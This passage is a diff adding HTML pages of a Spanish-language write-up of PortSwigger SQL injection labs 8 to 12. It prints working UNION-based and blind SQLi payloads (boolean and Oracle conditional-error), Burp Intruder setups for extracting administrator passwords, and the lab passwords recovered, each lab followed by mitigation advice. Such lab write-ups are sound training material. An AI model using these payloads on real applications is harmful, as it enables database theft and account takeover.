+                    <li><strong>Listas blancas (whitelisting):</strong> Es recomendable implementar listas blancas para parámetros como <code>category</code>, permitiendo únicamente valores válidos definidos previamente por la aplicación.</li>
+                    <li><strong>Gestión de errores:</strong> Ocultar mensajes detallados de error del servidor o de la base de datos, ya que estos pueden revelar información sobre la estructura de las consultas SQL.</li>
+                    <li><strong>Pruebas periódicas:</strong> Se recomienda realizar pruebas de penetración o análisis automatizados para identificar y corregir vulnerabilidades antes de que puedan ser explotadas.</li>
+                </ul>
+            </div>
+        </section>
+    </div>
+</article>
+<article class="lab-card" id="lab-8">
+    <header class="lab-header">
+        <span class="badge apprentice">Nivel: Apprentice (Básico)</span>
+        <h2>8. SQL injection UNION attack, finding a column containing text</h2>
+    </header>
+
+    <div class="highlight-box">
+        <p><strong>Tipo de SQLi:</strong> SQL Injection basado en UNION (UNION-based SQL Injection).</p>
+        <p><strong>Objetivo:</strong> Realizar un ataque SQL Injection utilizando <code>UNION SELECT</code> para hacer que la base de datos devuelva la cadena proporcionada por el laboratorio (<strong>xt4HXa</strong>) dentro de los resultados de la consulta.</p>
+        <p><strong>Vulnerabilidad:</strong> La aplicación web presenta una vulnerabilidad de SQL Injection en el parámetro <code>category</code> del filtro de productos. El valor ingresado se concatena directamente dentro de una consulta SQL sin validación, permitiendo insertar instrucciones adicionales mediante <code>UNION SELECT</code>.</p>
+    </div>
+
+    <div class="lab-content">
+        <h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+
+        <div class="step-detail">
+            <h4>1. Acceso al laboratorio</h4>
+            <p>En este laboratorio se analiza una aplicación que muestra productos dependiendo de la categoría seleccionada (Pets, Food & Drink, etc.). El filtro envía solicitudes HTTP utilizando el parámetro <code>category</code>.</p>
+            <p>Durante el análisis se observa que los resultados de la consulta se muestran directamente en la página web, lo que permite identificar si una inyección SQL es exitosa y utilizar un ataque basado en UNION para insertar resultados adicionales.</p>
+        </div>
+                <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab8.1.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>2. Intercepción de la petición con Burp Suite</h4>
+            <p>Se utilizó Burp Suite para interceptar la petición HTTP generada al seleccionar una categoría. En la pestaña <strong>Proxy → Intercept</strong>, se observó la solicitud:</p>
+            <div class="code-block">GET /filter?category=Pets</div>
+            <p>Este parámetro es el punto vulnerable donde se intentará la inyección SQL.</p>
+        </div>
+                <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab8.2.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>3. Envío de la petición a Repeater</h4>
+            <p>Se hizo clic derecho sobre la solicitud y se seleccionó <strong>Send to Repeater</strong>. Esto permite modificar la solicitud manualmente y analizar las respuestas del servidor de forma iterativa y rápida.</p>
+        </div>
+                        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab8.3.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>4. Determinar el número de columnas de la consulta</h4>
+            <p>Para realizar un ataque <code>UNION SELECT</code>, el número de columnas debe coincidir. Se utilizó el siguiente payload:</p>
+            <div class="code-block">' UNION SELECT NULL,NULL,NULL--</div>
+            <p>Al enviar la solicitud, el servidor respondió con <strong>HTTP 200 OK</strong>, lo que confirma que la consulta original devuelve <strong>3 columnas</strong>.</p>
+        </div>
+                        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab8.4" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>5. Identificar la columna que acepta texto</h4>
+            <p>El siguiente paso fue determinar qué columna puede mostrar datos de tipo texto. Se reemplazó el primer NULL por la cadena del laboratorio:</p>
+            <div class="code-block">' UNION SELECT 'xt4HXa',NULL,NULL--</div>
+            <p>El servidor respondió con un <strong>error 500 (Internal Server Error)</strong>, indicando que la primera columna no acepta tipos de datos de texto.</p>
+        </div>
+                        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab8.5" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>6. Probar la cadena en otra columna</h4>
+            <p>Debido al error anterior, se probó colocar la cadena en la segunda columna:</p>
+            <div class="code-block">' UNION SELECT NULL,'xt4HXa',NULL--</div>
+            <p>En esta ocasión, el servidor respondió correctamente (<strong>HTTP 200 OK</strong>), indicando que la segunda columna es compatible con datos de tipo texto.</p>
+        </div>
+                        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab8.6.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>7. Visualización del resultado en la página</h4>
+            <p>Al observar la respuesta en <strong>Render</strong>, se visualiza una nueva fila con el contenido: <code>xt4HXa</code>. Esto significa que el ataque fue exitoso. Al cumplirse el objetivo, la plataforma marca el laboratorio como resuelto y muestra el mensaje: <strong>“Congratulations, you solved the lab!”</strong>.</p>
+        </div>
+                        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab8.7.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab8.8.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <section class="mitigacion-section">
+            <h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+            <div class="mitigacion-card">
+                <p>Para prevenir vulnerabilidades de SQL Injection, se recomienda aplicar las siguientes medidas:</p>
+                <ul>
+                    <li><strong>Uso de consultas parametrizadas (Prepared Statements):</strong> Las consultas deben utilizar parámetros en lugar de concatenar la entrada del usuario.</li>
+                    <li><strong>Ejemplo seguro:</strong> <code>SELECT * FROM products WHERE category = ?</code></li>
+                    <li>Esto garantiza que la entrada del usuario sea tratada estrictamente como datos y nunca sea interpretada como código ejecutable por el motor de la base de datos.</li>
+                </ul>
+            </div>
+        </section>
+    </div>
+</article>
+    <article class="lab-card" id="lab-9">
+    <header class="lab-header">
+        <span class="badge practitioner" style="background: #f2994a;">Nivel: PRACTITIONER</span>
+        <h2>9. SQL injection UNION attack, retrieving data from other tables</h2>
+    </header>
+
+    <div class="highlight-box">
+        <p><strong>Tipo de SQLi:</strong> SQL Injection, específicamente mediante SQL UNION Attack, que permite combinar resultados de consultas para obtener información de otras tablas de la base de datos.</p>
+        <p><strong>Objetivo:</strong> Explotar la vulnerabilidad de SQL Injection en el parámetro <code>category</code> del filtro de productos para realizar un ataque UNION, extraer los username y password de la tabla <code>users</code>, y utilizar las credenciales obtenidas para iniciar sesión como administrator.</p>
+        <p><strong>Vulnerabilidad:</strong> La aplicación web no valida ni sanitiza correctamente la entrada del usuario en el parámetro <code>category</code>, permitiendo que un atacante inyecte consultas SQL arbitrarias. Esto posibilita ejecutar un ataque UNION que recupera datos sensibles de la tabla <code>users</code>.</p>
+    </div>
+
+    <div class="lab-content">
+        <h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+        <div class="step-detail">
+            <h4>Paso 1: Interceptar la petición con Burp Suite</h4>
+            <p>Una vez abierto el laboratorio y dentro de Burp Suite, usaremos el navegador de este el cual es Chromium. Dentro de Chromium entraremos con la url del laboratorio.</p>
+            <p>Volviendo a Burp Suite activamos <strong>intercept off</strong>, para así interceptar la petición. Dentro del navegador, vamos a cambiar la categoria de productos, en este caso a <strong>Gifts</strong>, para hacer el tipo de petición que necesitamos, ya que ese parametro de category es vulnerable.</p>
+        </div>
+                 <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab9.1.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                             <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab9.2.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab9.3.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    
+        <div class="step-detail">
+            <h4>Paso 2: Confirmar que es vulnerable a SQLi</h4>
+            <p>Para confirmar que ese parametro es vulnerable a SQLi, enviamos la petición al repetidor, dentro de Burp Suite y la modificamos cambiando la categoría “Gift”, por: <code>'</code></p>
+            <p>Como resultado de repetir la petición modificada, el servidor respondió con un un error, lo cual indica que es vulnerable ya que se rompió la consulta (muy buena señal de SQLi).</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab9.4.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab9.5.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    
+                    
+        <div class="step-detail">
+            <h4>Paso 3: Determinar número de columnas</h4>
+            <p>Sabemos que debemos usar UNION, pero necesitamos saber cuántas columnas devuelve la consulta original. Se utilizó el payload:</p>
+            <div class="code-block">'+UNION+SELECT+NULL,NULL--</div>
+            <p>El lab indica que son 2 columnas. El servidor responde “ok”, lo cual indica que la inyección se hizo correctamente y que existen al menos 2 columnas.</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab9.6.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    
+
+        <div class="step-detail">
+            <h4>Paso 4: Probar UNION con 2 columnas</h4>
+            <p>Se identifica si ambas columnas aceptan texto. Usa el payload que indica el lab:</p>
+            <div class="code-block">'+UNION+SELECT+'abc','def'--</div>
+            <p>Se inyecta usando de nuevo el repetidor y la consulta. <strong>Resultado esperado:</strong> En la página podemos ver que se agregó correctamente las cadenas “abc” y “def”.</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab9.7.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab9.8.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    
+        <div class="step-detail">
+            <h4>Paso 6: Extraer datos de la tabla users</h4>
+            <p>El laboratorio dice que existe la tabla: <code>users</code> con columnas <code>username</code> y <code>password</code>. Entonces se usa el payload:</p>
+            <div class="code-block">'+UNION+SELECT+username,+password+FROM+users--</div>
+            <p>Obtuvimos como resultado las credenciales de administrador. En este caso es:</p>
+            <ul>
+                <li><strong>User:</strong> administrator</li>
+                <li><strong>Password:</strong> goc321j92ofkd0naozyx</li>
+            </ul>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab9.9.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab9.10.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    
+        <div class="step-detail">
+            <h4>Paso 7: Iniciar sesión como administrador</h4>
+            <p>Una vez con las credenciales obtenidas, dentro del laboratorio vamos a <strong>“My account”</strong> y entramos en la página de login con las credenciales que obtuvimos. Así es como accedemos y el laboratorio queda solucionado.</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab9.11.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab9.12.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab9.13.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+
+        <div class="mitigacion-card" style="background: #fdfdfd; border-left: 5px solid #272822; padding: 30px;">
+            <h3><i class="fas fa-file-alt"></i> Informe Final</h3>
+            
+            <h4>Vulnerabilidad Identificada</h4>
+            <p>Se identificó una vulnerabilidad de SQL Injection en el parámetro <code>category</code> del filtro de productos de la aplicación web. La aplicación no valida ni sanitiza adecuadamente la entrada del usuario antes de incorporarla a la consulta SQL, lo que permite a un atacante modificar la consulta original e incluir una instrucción SQL UNION Attack.</p>
+            <p>Mediante esta técnica fue posible combinar la consulta original con otra consulta dirigida a la tabla <code>users</code>, logrando extraer información sensible almacenada en la base de datos, específicamente los nombres de usuario y contraseñas. Con las credenciales obtenidas se pudo iniciar sesión como el usuario administrator, comprometiendo la seguridad de la aplicación.</p>
+
+            <h4>Payload Utilizado</h4>
+            <div class="code-block">'+UNION+SELECT+username,+password+FROM+users--</div>
+            <p>Este payload cierra la consulta original, añade una instrucción UNION SELECT que recupera los campos username y password de la tabla users, y utiliza el comentario -- para ignorar el resto de la consulta original.</p>
+
+            <h4>Mitigación Recomendada</h4>
+            <ul>
+                <li>Utilizar <strong>consultas parametrizadas (Prepared Statements)</strong> o ORM seguros, evitando concatenar directamente la entrada del usuario en las consultas SQL.</li>
+                <li>Implementar <strong>validación y sanitización de entradas</strong> para asegurar que los parámetros solo contengan valores esperados.</li>
+                <li>Aplicar el <strong>principio de mínimo privilegio</strong> en las cuentas de base de datos utilizadas por la aplicación.</li>
+                <li>Implementar mecanismos de monitoreo y registro de consultas sospechosas, así como el uso de <strong>Web Application Firewalls (WAF)</strong> para detectar y bloquear intentos de inyección SQL.</li>
+            </ul>
+        </div>
+    </div>
+</article>
+    <article class="lab-card" id="lab-10">
+    <header class="lab-header">
+        <span class="badge practitioner" style="background: #f2994a;">Nivel: PRACTITIONER</span>
+        <h2>10. SQL injection UNION attack, retrieving multiple values in a single column</h2>
+    </header>
+
+    <div class="highlight-box">
+        <p><strong>Tipo de SQLi:</strong> SQL Injection, específicamente mediante SQL UNION Attack, que permite combinar resultados de consultas para obtener información de otras tablas de la base de datos.</p>
+        <p><strong>Objetivo:</strong> Explotar una vulnerabilidad de Inyección SQL en el filtro de categorías de productos para extraer las credenciales (nombres de usuario y contraseñas) de la tabla <code>users</code>. El reto principal radica en que la consulta original solo devuelve una columna que admite datos de tipo texto (string), por lo que es necesario combinar múltiples valores en un solo campo para extraerlos con éxito.</p>
+        <p><strong>Vulnerabilidad:</strong> La aplicación web no valida ni sanitiza correctamente la entrada del usuario en el parámetro <code>category</code>, permitiendo que un atacante inyecte consultas SQL arbitrarias. Esto posibilita ejecutar un ataque UNION que combina la consulta original con otra que recupera datos sensibles de la tabla <code>users</code>, exponiendo credenciales almacenadas en la base de datos.</p>
+    </div>
+
+    <div class="lab-content">
+        <h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+        <p>Como es costumbre, abriremos el laboratorio dentro de la web de Portswigger, copiando el enlace e iniciando Burp Suite.</p>
+            <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab10.1.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+            <p>Lo primero que haremos será filtrar los productos por alguno de los filtros que aparecen en la cabecera de la lista, con esto conseguiremos capturar una solicitud <strong>GET</strong> dentro del proxy de Burp Suite, la cual manda la consulta dentro del enlace, en el parámetro <code>category</code>.</p>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab10.2.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+
+        <div class="step-detail">
+            <h4>Paso 1: Análisis de Reglas y Columnas</h4>
+            <p>Con el paquete atrapado, ahora podremos editar la solicitud antes de ser enviada al servidor, el único inconveniente es que debemos de cumplir con dos reglas de las bases de datos relacionales: la consulta inyectada debe devolver el mismo número de columnas que la original, y los tipos de datos deben ser compatibles.</p>
+            <p>Mediante análisis, se observó que la consulta al a BD nos esta devolviendo dos columnas, por lo cual seguiremos la siguiente sintaxis para que nuestras solicitudes sean aceptadas:</p>
+            <div class="code-block">'+UNION+SELECT+NULL,'abc'--</div>
+            <p>El uso de <strong>NULL</strong> en la primera posición evita errores de tipo de dato mientras que <strong>'abc'</strong> en la segunda posición confirma que la segunda columna es la que renderiza cadenas de texto en la respuesta HTTP. El <code>--</code> comenta el resto de la consulta original para evitar errores de sintaxis.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 2: Concatenación de Datos</h4>
+            <p>Dando múltiples inspecciones a la base de datos, determinamos que la tabla que contiene a los usuarios se llama <strong>‘users’</strong>, y la tabla que contiene las contraseñas es <strong>‘password’</strong>, el problema recae en que solo disponemos de la segunda columna para extraer texto, no podemos pedir username y password en columnas separadas. La solución que proponemos es concatenar ambos campos en uno solo.</p>
+            <p>Diseñamos el payload que se ingresará en <code>category</code>, el cual es:</p>
+            <div class="code-block">'+UNION+SELECT+NULL,username||'~'||password+FROM+users--</div>
+            <p>Utilizamos el operador <code>||</code> para concatenar las dos tablas, al inyectar <code>username||'~'||password</code>, le indicamos a la base de datos que fusione el nombre de usuario y la contraseña, separados por el carácter <strong>~</strong>, todo esto se extrae de la tabla <code>users</code> y se acomoda en la única columna de texto disponible.</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab10.3.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>Paso 3: Verificación de Resultados</h4>
+            <p>Con esto comprobamos que nuestro payload fue exitoso, logrando extraer de la consulta principal los usuarios y contraseñas, demostrando una brecha crítica de confidencialidad.</p>
+            <p>Comprobamos que las credenciales son correctas accediendo a la cuenta de administrador.</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab10.4.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+    
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab10.5.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="highlight-box" style="border-left: 5px solid #272822; background: #f4f4f4;">
+            <p>Con eso concluimos el laboratorio numero 10 <strong>‘SQL injection UNION attack, retrieving multiple values in a single column’</strong>.</p>
+        </div>
+
+        <section class="mitigacion-section">
+            <h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+            <div class="mitigacion-card">
+                <ul>
+                    <li>Utilizar consultas parametrizadas o <strong>prepared statements</strong> en todas las interacciones con la base de datos.</li>
+                    <li>Aplicar el principio de <strong>menor privilegio</strong> en la cuenta de base de datos.</li>
+                    <li>Sanitización y validación de entradas mediante <strong>listas blancas</strong>.</li>
+                </ul>
+            </div>
+        </section>
+    </div>
+</article>
+    <article class="lab-card" id="lab-11">
+    <header class="lab-header">
+        <span class="badge practitioner" style="background: #f2994a;">Nivel: Intermedio (Practitioner)</span>
+        <h2>11. Blind SQL injection with conditional responses</h2>
+    </header>
+
+    <div class="highlight-box">
+        <p><strong>Tipo de SQLi:</strong> Inyección SQL Ciega basada en Booleanos (Boolean-based Blind SQLi)</p>
+        <p><strong>Objetivo:</strong> Explotar la vulnerabilidad para enumerar y extraer la contraseña del usuario administrator, logrando finalmente la autenticación en la plataforma.</p>
+        <p><strong>Vulnerabilidad:</strong> El sistema procesa la cookie <code>TrackingId</code> en una consulta SQL sin la debida sanitización. Aunque no devuelve datos de la base de datos ni errores en pantalla (es una inyección ciega), la aplicación cambia su comportamiento y muestra un mensaje de "Welcome back" exclusivamente si la consulta inyectada resulta verdadera (TRUE). Esto permite inferir la estructura y los datos internos realizando preguntas de "sí o no" a la base de datos.</p>
+    </div>
+
+    <div class="lab-content">
+        <h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+        <p>Accediendo a la página mediante el navegador de Burp Suite, revisamos y navegamos por la página, descubriendo que la pagina te muestra un ‘Welcome Back!’ al lado del botón ‘Home’ y ‘My account’, determinando que este mensaje se muestra por medio de una cookie.</p>
+        
+        <p>Capturando la solicitud de la pagina mediante Burp Suite, podemos revisar la cookie, por lo cual lo pasaremos al repeater para probar la sesión y el mensaje.</p>
+
+        
+
+        <div class="step-detail">
+            <h4>Paso 1: Verificación de respuesta Booleana</h4>
+            <p>Aquí nos centraremos en la variable de la cookie ‘TrackingId’, revisaremos si podemos ingresar desde esta variable a la BD, por lo cual probaremos una consulta simple:</p>
+            <div class="code-block">TrackingId=R8Y42FuF2GZDJ9w4’ AND '1'='2</div>
+            <p>Probaremos si el texto de bienvenida responde en relación de un booleano; si el texto desaparece de nuestra sesión, entonces podremos manejar la base de datos mediante la cookie.</p>
+            <p><strong>Resultado:</strong> Tuvimos una respuesta positiva, descubriendo que el texto si despareció de la página al mandar una sentencia falsa.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 2: Confirmación de Tabla y Usuario</h4>
+            <p>Probaremos si la tabla ‘users’ existe con la siguiente consulta:</p>
+            <div class="code-block">TrackingId=R8Y42FuF2GZDJ9w4' AND (SELECT 'a' FROM users LIMIT 1)='a</div>
+            <p>Comprobamos que el texto aparece, por lo cual confirmamos la tabla ‘users’ existe. Ahora, consultaremos la tabla para buscar al usuario administrador:</p>
+            <div class="code-block">TrackingId=R8Y42FuF2GZDJ9w4' AND (SELECT 'a' FROM users WHERE username='administrator')='a</div>
+            <p>De nueva cuenta, confirmamos el usuario administrador en la tabla.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 3: Determinar Longitud de la Contraseña</h4>
+            <p>Intentaremos consultar la columna de contraseñas preguntando si la longitud es igual a cierto número mediante un <strong>Sniper Attack</strong> en Intruder:</p>
+            <div class="code-block">TrackingId=R8Y42FuF2GZDJ9w4' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) = §1§)='a</div>
+            <p>Seleccionamos <strong>Numbers</strong> en Payload type, configuramos el rango, y activamos el <strong>Grep-Match</strong> con la frase ‘Welcome back’. Al concluir, descubrimos que la contraseña tiene <strong>20 caracteres</strong>.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 4: Extracción de caracteres (Cluster Bomb Attack)</h4>
+            <p>Diseñamos una consulta para extraer cada carácter iterando las 20 posiciones y probando cada posible letra/número:</p>
+            <div class="code-block">TrackingId=Fh1TQZhc9X9dMFPS' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'</div>
+            <p>Configuramos dos payloads:</p>
+            <ul>
+                <li><strong>Payload 1:</strong> Números del 1 al 20 (posición).</li>
+                <li><strong>Payload 2:</strong> Lista simple con letras (a-z) y números (0-9).</li>
+            </ul>
+            <p>Este <strong>Cluster Bomb attack</strong> realizó un total de 720 solicitudes. Al finalizar, mediante la bandera de Grep – Match (o Extract), vimos en qué posiciones la página dio TRUE.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 5: Resolución</h4>
+            <p>Armando la contraseña anotando cada letra en su respectiva posición, descubrimos la contraseña del administrador: <strong>kycwnnz2eed0t1jud1op</strong></p>
+            <p>Con el usuario y la contraseña, comprobamos los resultados en el login, los cuales fueron positivos y concluimos el laboratorio.</p>
+        </div>
+
+        <section class="mitigacion-section">
+            <h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+            <div class="mitigacion-card">
+                <p>La mitigación principal para Blind SQL Injection incluye:</p>
+                <ul>
+                    <li>Uso de <strong>Consultas Parametrizadas</strong>: Evita que los valores de las cookies sean interpretados como lógica SQL.</li>
+                    <li><strong>Validación de Cookies</strong>: Asegurar que el <code>TrackingId</code> siga un formato esperado (ej. alfanumérico de longitud fija) antes de procesarlo.</li>
+                    <li><strong>Deshabilitar mensajes de depuración</strong> y evitar que el comportamiento de la UI (mensajes condicionales) dependa directamente del éxito de una consulta a la BD.</li>
+                </ul>
+            </div>
+        </section>
+    </div>
+</article>
+    <article class="lab-card" id="lab-12">
+    <header class="lab-header">
+        <span class="badge practitioner" style="background: #f2994a;">Nivel: Intermedio (Practitioner)</span>
+        <h2>12. Blind SQL injection with conditional errors</h2>
+    </header>
+
+    <div class="highlight-box">
+        <p><strong>Tipo de SQLi:</strong> Inyección SQL Ciega basada en Errores Condicionales (Conditional Error-based Blind SQLi)</p>
+        <p><strong>Objetivo:</strong> Explotar una vulnerabilidad ciega en la que la aplicación no muestra diferencias en el contenido web, pero sí cambia el código de estado HTTP al ocurrir un error fatal en la base de datos. El fin es enumerar la contraseña del usuario administrator forzando errores matemáticos.</p>
+        <p><strong>Vulnerabilidad:</strong> El servidor concatena la cookie <code>TrackingId</code> directamente en la consulta SQL. Si la consulta inyectada genera un error de ejecución en el motor SQL (como una división por cero), el servidor devuelve un <strong>HTTP 500 (Internal Server Error)</strong>. Esto permite hacer preguntas de "sí o no" condicionando un error deliberado a una premisa verdadera.</p>
+    </div>
+
+    <div class="lab-content">
+        <h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+        <p>Entramos al laboratorio e inspeccionamos la página; esta vez no hay cambios visibles. Procederemos a atrapar una solicitud y ver cómo se comporta el sitio agregando una comilla simple (<code>'</code>) al final del <code>TrackingId</code>.</p>
+
+        
+
+        <div class="step-detail">
+            <h4>Paso 1: Confirmación de Inyección y Detección del DBMS</h4>
+            <p>Al agregar una comilla simple, el servidor arrojó un error. Al agregar dos comillas (<code>''</code>), el error desapareció, confirmando la inyección. Luego probamos:</p>
+            <div class="code-block">TrackingId=uGePpEdWgmwfXu35'||(SELECT '')||'</div>
+            <p>Esta consulta falló. Sospechando de <strong>Oracle</strong>, probamos con su tabla dual:</p>
+            <div class="code-block">TrackingId=uGePpEdWgmwfXu35 '||(SELECT '' FROM dual)||'</div>
+            <p>No recibimos error, confirmando que es una base de datos Oracle, la cual requiere estrictamente la cláusula <code>FROM</code>.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 2: Forzado de Errores Condicionales</h4>
+            <p>Construimos una estructura lógica utilizando <code>CASE</code> combinada con un error matemático forzado (división por cero):</p>
+            <div class="code-block">TrackingId=uGePpEdWgmwfXu35’ ||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</div>
+            <p>Cada vez que la sentencia sea verdadera (TRUE), el servidor regresará un <strong>"Internal Server Error"</strong>. Usaremos este error como ventana para consultar información.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 3: Verificación de Usuario y Longitud de Contraseña</h4>
+            <p>Confirmamos la existencia del administrador (recibiendo un error 500):</p>
+            <div class="code-block">TrackingId=uGePpEdWgmwfXu35'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</div>
+            <p>Luego determinamos la longitud de la contraseña usando <strong>Intruder (Sniper Attack)</strong>:</p>
+            <div class="code-block">TrackingId=uGePpEdWgmwfXu35'||(SELECT CASE WHEN LENGTH(password)= §1§ THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'</div>
+            <p>Editamos el Grep – Match para marcar los errores 500. Los resultados mostraron que la página dio error en el número <strong>20</strong>, confirmando esa longitud.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 4: Extracción de la Contraseña (Iteración Manual)</h4>
+            <p>Para conseguir la contraseña, diseñamos un payload para consultar cada carácter:</p>
+            <div class="code-block">TrackingId=uGePpEdWgmwfXu35 '||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</div>
+            <p>Para evitar el ruido y el tiempo excesivo de un ataque automático masivo, se optó por iterar manualmente las posiciones del 1 al 20, usando el diccionario de caracteres en Intruder para cada posición.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 5: Resolución</h4>
+            <p>Al finalizar las iteraciones, descubrimos la contraseña: <strong>0xkkbi6793o8z2ep4map</strong>. Procedimos a probarla en la sección de login, logrando un inicio de sesión correcto y concluyendo el laboratorio.</p>
+        </div>
+
+        <div class="evidencia-container" style="text-align: center; margin: 30px 0;">
+            <h4>Evidencia de Intruder: Error 500 detectado</h4>
+            <img src="img/evidencias/lab_blind_errors.png" alt="Burp Suite Intruder Grep-Match for HTTP 500" style="max-width: 100%; border-radius: 8px; border: 1px solid #ddd;">
+        </div>
+
+        <section class="mitigacion-section">
+            <h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+            <div class="mitigacion-card">
+                <ul>
+                    <li><strong>Consultas Parametrizadas:</strong> Es la defensa fundamental contra cualquier tipo de SQLi.</li>
+                    <li><strong>Manejo Genérico de Errores:</strong> Configurar el servidor para que no devuelva respuestas distintas (como el código 500) ante excepciones de la base de datos; en su lugar, devolver una página de error estándar común para todos los casos.</li>
+                    <li><strong>Seguridad en Cookies:</strong> No utilizar datos provenientes de cookies directamente en consultas SQL sin validación previa.</li>
+                </ul>
+            </div>
+        </section>
+    </div>
+</article>
